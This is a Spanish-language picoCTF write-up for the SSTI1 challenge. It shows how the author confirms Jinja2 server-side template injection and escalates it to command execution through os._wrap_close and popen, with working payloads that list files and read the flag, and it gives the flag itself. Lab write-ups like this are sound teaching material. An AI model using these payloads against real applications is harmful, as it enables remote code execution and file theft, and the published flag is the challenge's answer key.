# SSTI1 

## Descripción del Problema
El reto nos presenta una aplicación web con una caja de texto que permite publicar anuncios. El enunciado insinúa que el uso de motores de plantillas (*templating*) es genial, lo que sugiere una vulnerabilidad de inyección de plantillas en el lado del servidor.

---

## Análisis y Solución

### Fase 1: Detección e Identificación
1. Introdujimos un payload matemático básico en la entrada: `{{7*7}}`.
2. El servidor evaluó la operación devolviendo `49`, lo que confirmó una vulnerabilidad de **Server-Side Template Injection (SSTI)** bajo el motor **Jinja2 (Python/Flask)**.

### Fase 2: Enumeración de Clases
Para buscar vectores de Ejecución de Comandos Remotos (RCE), volcamos las subclases cargadas en la memoria del intérprete de Python:
```text
{{ ''.__class__.__mro__[1].__subclasses__() }}
````

Dentro del volcado localizamos la clase `<class 'os._wrap_close'>` ubicada de forma exacta en el **índice 132**.

### Ejecución y Extracción

1. Listamos los archivos del directorio de trabajo usando el método `popen`:

    - **Payload:** `{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read() }}`

    - **Resultado:** `__pycache__ app.py flag requirements.txt`

2. Leímos el contenido del archivo secreto empleando el comando `cat`:

    - **Payload:** `{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat flag').read() }}`


## Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
```